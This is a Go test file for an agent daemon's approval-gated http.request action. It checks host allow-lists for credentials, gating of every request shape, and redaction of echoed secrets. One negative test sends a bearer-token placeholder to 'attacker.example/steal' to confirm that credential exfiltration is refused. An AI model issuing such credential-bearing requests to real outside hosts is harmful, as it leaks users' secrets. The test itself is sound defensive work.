package daemon

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"testing"
)

// execHTTP calls http.request (now always gated), approves and runs it, and
// returns the executed result map (status/headers/body), or "" result and the
// failure string if the run errored. Generic http.request is held for approval,
// so a test that needs to exercise the outbound request itself runs it through
// the approval path (Astra A10 gate-all).
func execHTTP(t *testing.T, h *harness, key string, args map[string]any) (map[string]any, string) {
	t.Helper()
	r := h.do("POST", "/v1/actions/http.request", map[string]any{"args": args}, bearer(key), false)
	// http.request is always gated now: anything but 202 is a setup error, never a
	// silent 200 that could let an empty result satisfy a negative leak assertion
	// (Daru6 run6 P2 test-quality).
	if r.code != 202 {
		t.Fatalf("http.request should be held (202), got %d: %s", r.code, r.raw)
	}
	id, _ := r.body["approval_id"].(string)
	if err := h.s.store.DecideApproval(id, "approved", "test"); err != nil {
		t.Fatalf("approve: %v", err)
	}
	h.s.runApproval(id)
	ap, err := h.s.store.GetApproval(id)
	if err != nil {
		t.Fatalf("get approval: %v", err)
	}
	if ap.Error != "" {
		return nil, ap.Error
	}
	// A successful run must have produced a non-empty, parseable result, so a
	// vacuous/empty result can't pass a "no secret present" check.
	if ap.Status != "executed" {
		t.Fatalf("approval status = %q, want executed", ap.Status)
	}
	var res map[string]any
	if err := json.Unmarshal(ap.Result, &res); err != nil || len(res) == 0 {
		t.Fatalf("executed result empty or unparseable: err=%v result=%s", err, ap.Result)
	}
	return res, ""
}

// put a credential with an allowed-hosts meta directly.
func putHostCred(t *testing.T, h *harness, name, token string, hosts []string) {
	t.Helper()
	hs := make([]any, len(hosts))
	for i, x := range hosts {
		hs[i] = x
	}
	if _, err := h.s.store.PutCredential(name, "api_key", name, name, map[string]any{"allowed_hosts": hs}, map[string]string{"token": token}); err != nil {
		t.Fatal(err)
	}
	h.s.red.Add(name+":token", token)
}

func TestHTTPRequestHostAllowList(t *testing.T) {
	h := newHarness(t)
	h.s.ext = http.DefaultClient // tests hit a loopback server
	var gotAuth string
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth = r.Header.Get("Authorization")
		w.Write([]byte(`{"ok":true}`))
	}))
	defer up.Close()
	upURL, _ := url.Parse(up.URL)
	upHost := upURL.Host       // 127.0.0.1:port, for the request URL
	upName := upURL.Hostname() // 127.0.0.1, for the allow-list (no port)
	// The credential only allows the test host; sending it there works…
	putHostCred(t, h, "svc", "SECRET-TOKEN-abcdefghijklmnop", []string{upName})
	key := h.agent("a1")

	// Point the outbound client at the loopback test server (the action still
	// requires an https URL). http.request is held for approval, so execHTTP runs
	// it through the approval path to exercise the outbound request.
	h.s.ext = &http.Client{Transport: rewriteToHTTP{up.URL}}
	_, errStr := execHTTP(t, h, key, map[string]any{
		"method": "GET", "url": "https://" + upHost + "/",
		"headers": []any{"Authorization: Bearer {{svc}}"},
	})
	if errStr != "" {
		t.Fatalf("allowed-host request failed: %s", errStr)
	}
	if gotAuth != "Bearer SECRET-TOKEN-abcdefghijklmnop" {
		t.Fatalf("secret not substituted into header: %q", gotAuth)
	}
	// …but the same placeholder sent to a host NOT on the allow-list is refused
	// before any request goes out.
	gotAuth = ""
	if _, errStr := execHTTP(t, h, key, map[string]any{
		"method": "GET", "url": "https://attacker.example/steal",
		"headers": []any{"Authorization: Bearer {{svc}}"},
	}); errStr == "" {
		t.Fatal("placeholder sent to a non-allowed host")
	}
	if gotAuth != "" {
		t.Fatal("request went out despite host not allowed")
	}
	// A credential with no allowed_hosts can't be used at all.
	if _, err := h.s.store.PutCredential("nohosts", "api_key", "nohosts", "nohosts", nil, map[string]string{"token": "aaaaaaaaaaaa"}); err != nil {
		t.Fatal(err)
	}
	if _, errStr := execHTTP(t, h, key, map[string]any{
		"method": "GET", "url": "https://whatever.example/", "headers": []any{"X-Key: {{nohosts}}"},
	}); errStr == "" {
		t.Fatal("credential without allowed_hosts was usable")
	}
}

// rewriteToHTTP sends every request to base (a loopback test server), so the
// action can require https while the test server speaks http.
type rewriteToHTTP struct{ base string }

func (x rewriteToHTTP) RoundTrip(r *http.Request) (*http.Response, error) {
	u, _ := url.Parse(x.base)
	r.URL.Scheme = "http"
	r.URL.Host = u.Host
	r.Host = u.Host
	return http.DefaultTransport.RoundTrip(r)
}

func TestHTTPRequestWritesGated(t *testing.T) {
	h := newHarness(t)
	a, ok := h.s.reg.Get("http.request")
	if !ok {
		t.Fatal("http.request missing")
	}
	// Generic http.request is held unconditionally: a host allow-list is not
	// operation approval, and a GET's path/query can itself select an effect
	// (Astra A10). Every shape — credentialed read, bare read, override, writes —
	// must be gated.
	for _, args := range []map[string]any{
		{"method": "GET", "url": "https://x.example/", "headers": []any{"Authorization: Bearer {{svc}}"}},
		{"method": "GET", "url": "https://x.example/"},
		{"method": "HEAD", "url": "https://x.example/items/1/delete", "headers": []any{"Authorization: Bearer {{svc}}"}},
		{"method": "GET", "url": "https://x.example/", "headers": []any{"Authorization: Bearer {{svc}}", "X-HTTP-Method-Override: DELETE"}},
		{"method": "POST", "url": "https://x.example/"},
		{"method": "DELETE", "url": "https://x.example/"},
	} {
		v, err := a.Validate(args)
		if err != nil {
			t.Fatalf("validate %v: %v", args, err)
		}
		if !a.IsGated(v) {
			t.Fatalf("http.request must be held for approval: %v", args)
		}
	}
}

func TestHTTPRequestRedactsDecodedSecretInResponse(t *testing.T) {
	h := newHarness(t)
	secret := "SECRET-TOKEN-abcdefghijklmnop"
	b64 := base64.StdEncoding.EncodeToString([]byte(secret))
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// The service echoes the credential back, base64-encoded.
		_, _ = io.WriteString(w, `{"stored":"`+b64+`","plain":"`+secret+`"}`)
	}))
	defer up.Close()
	upURL, _ := url.Parse(up.URL)
	putHostCred(t, h, "svc", secret, []string{upURL.Hostname()})
	h.s.ext = &http.Client{Transport: rewriteToHTTP{up.URL}}
	key := h.agent("a1")
	res, errStr := execHTTP(t, h, key, map[string]any{
		"method": "GET", "url": "https://" + upURL.Host + "/", "headers": []any{"Authorization: Bearer {{svc}}"},
	})
	if errStr != "" {
		t.Fatalf("request failed: %s", errStr)
	}
	raw, _ := json.Marshal(res)
	if bytes.Contains(raw, []byte(secret)) {
		t.Fatal("plain secret echoed back unredacted")
	}
	if bytes.Contains(raw, []byte(b64)) {
		t.Fatal("base64-encoded secret survived redaction")
	}
}
